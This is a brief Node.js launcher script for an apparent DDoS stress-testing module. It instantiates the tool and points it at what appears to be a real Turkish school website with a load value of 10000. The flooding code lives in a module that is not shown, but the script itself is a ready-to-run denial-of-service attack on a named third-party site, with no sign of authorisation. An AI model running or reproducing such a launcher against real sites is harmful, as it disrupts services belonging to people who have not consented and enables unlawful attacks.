#!/usr/bin/env node
/*
 * DDoS Stress
 * https://github.com/mlazarov/ddos-stress
 *
 * Copyright (c) 2015, Martin Lazarov
 * Licensed under the MIT license.
 */

/**
 * Module dependencies.
 */

var Stress = require('./');

var StressServer = new Stress();

StressServer.run('https://sultanciftligiortaokulu.meb.k12.tr/',10000);

